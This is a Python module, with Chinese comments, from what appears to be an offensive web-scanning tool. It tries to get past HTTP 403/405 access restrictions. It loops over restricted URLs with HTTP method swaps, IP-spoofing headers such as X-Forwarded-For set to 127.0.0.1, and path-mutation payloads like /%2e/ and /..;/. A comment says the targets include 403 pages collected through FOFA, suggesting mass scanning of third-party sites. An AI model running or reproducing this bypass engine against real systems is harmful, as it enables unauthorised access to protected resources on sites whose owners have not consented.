import asyncio
from utils.request_client import request_client
from utils.logger import logger
from utils.deduplicator import deduplicator


class Bypasser:
    """
    403/405 绕过模块 (核心功能 3)
    功能：Header注入、路径变异、方法替换
    """

    def __init__(self, output_manager, config_loader, concurrency=20):
        self.om = output_manager
        self.loader = config_loader
        self.concurrency = concurrency
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"}
        ]

    async def bypass_url(self, url, sem, bypass_payloads):
        """对单个受限 URL 进行多维度绕过测试"""
        base_url = url.rstrip('/')

        async def attempt(test_url, header=None, method="GET"):
            async with sem:
                resp, html = await request_client.fetch(
                    test_url, method=method, headers=header, timeout=6
                )
                if resp and resp.status == 200:
                    # 使用去重逻辑确保内容不是虚假的 200 (WAF 误报)
                    if deduplicator.is_new_content(html):
                        msg = f"[Bypass Success] {method} {test_url}"
                        if header: msg += f" | Header: {header}"
                        logger.success(msg)
                        self.om.save("bypass", msg)
                        return True
                return False

        tasks = []
        # 1. 尝试不同 HTTP 方法
        for m in ["POST", "PUT", "TRACE", "OPTIONS"]:
            tasks.append(attempt(url, method=m))

        # 2. 尝试 Header 注入
        for h in self.bypass_headers:
            tasks.append(attempt(url, header=h))

        # 3. 尝试路径变异 (如 /admin -> /admin/.)
        for p in bypass_payloads:
            # 处理路径拼接逻辑
            p_url = f"{base_url}{p}" if p.startswith(('/', '.')) else f"{base_url}/{p}"
            tasks.append(attempt(p_url))

        await asyncio.gather(*tasks)

    async def run(self, restricted_urls):
        if not restricted_urls: return

        # 加载绕过字典 (如 /%2e/, /..;/, .json 等)
        bypass_payloads = self.loader.load_dict("bypass.txt")
        if not bypass_payloads:
            bypass_payloads = ["/%2e/", "/..;/", "/.", "/?id=1"]  # 基础内置

        logger.info(f"[*] 启动绕过引擎，目标数量: {len(restricted_urls)}")
        sem = asyncio.Semaphore(self.concurrency)

        # 这里的 restricted_urls 包含 FOFA 采集的 403 和 Scanner 发现的 403
        tasks = [asyncio.create_task(self.bypass_url(url, sem, bypass_payloads)) for url in restricted_urls]
        await asyncio.gather(*tasks)